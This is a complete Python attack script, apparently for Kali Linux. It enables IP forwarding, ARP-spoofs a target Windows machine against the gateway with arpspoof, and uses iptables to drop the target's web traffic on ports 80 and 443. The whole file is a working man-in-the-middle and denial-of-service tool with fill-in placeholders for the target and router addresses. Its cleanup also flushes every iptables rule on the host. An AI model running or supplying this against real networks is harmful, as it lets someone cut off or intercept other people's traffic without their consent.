import os
import subprocess
import time

# Change this to match your network
gateway_ip = "192.168.1.1"  # Router IP (Check using: route -n)
target_ip = "192.168.1.100"  # Target Windows machine (Use: arp -a)
interface = "eth0"  # Your Kali network interface

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding Enabled")

def block_web_traffic():
    print("[+] Blocking Web Access for Target")
    os.system(f"iptables -A FORWARD -s {target_ip} -p tcp --dport 80 -j DROP")
    os.system(f"iptables -A FORWARD -s {target_ip} -p tcp --dport 443 -j DROP")

def start_arpspoof():
    print(f"[+] Spoofing ARP for Target {target_ip} via Gateway {gateway_ip}")
    return subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def cleanup():
    print("\n[+] Restoring Network...")
    os.system("iptables --flush")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Run this script as root.")
        exit(1)

    enable_ip_forwarding()
    block_web_traffic()
    arpspoof_process = start_arpspoof()

    try:
        print("[+] Web Blocking Active! Press CTRL+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()
        arpspoof_process.terminate()
        print("[+] Web Access Restored.")
